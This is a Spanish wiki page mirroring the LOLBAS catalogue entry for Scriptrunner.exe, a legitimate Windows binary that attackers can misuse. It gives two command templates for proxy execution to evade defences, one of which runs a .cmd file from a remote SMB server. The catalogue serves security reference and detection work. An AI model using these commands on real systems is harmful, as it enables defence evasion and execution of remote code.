# LOLBAS: Scriptrunner.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Execute`

Execute binary through proxy binary to evade defensive counter measures

## Comandos

### Execute binary through proxy binary to evade defensive counter measures

Execute · priv: User · T1202

```cmd
Scriptrunner.exe -appvscript {PATH:.exe}
```

Executes executable

### Execute binary through proxy binary from external server to evade defensive counter measures

Execute · priv: User · T1218

```cmd
ScriptRunner.exe -appvscript {PATH_SMB:.cmd}
```

Executes cmd file from remote server

